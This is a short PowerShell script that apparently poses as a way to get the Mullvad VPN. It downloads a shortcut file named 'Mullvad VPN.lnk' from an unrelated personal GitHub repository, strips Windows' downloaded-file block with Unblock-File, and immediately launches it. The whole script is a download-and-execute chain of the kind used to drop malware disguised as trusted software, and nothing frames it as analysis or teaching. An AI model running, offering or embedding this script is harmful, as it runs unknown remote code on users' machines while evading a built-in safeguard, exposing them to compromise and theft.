# Define the URL and output path
$url = "https://raw.githubusercontent.com/Migss2x/testzzz/main/Mullvad%20VPN.lnk"
$output = "$env:USERPROFILE\Downloads\Mullvad VPN.lnk"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

# Unblock the file if Windows blocked it
Unblock-File -Path $output

# Wait to ensure file is ready
Start-Sleep -Seconds 2

# Start the file
Start-Process -FilePath $output
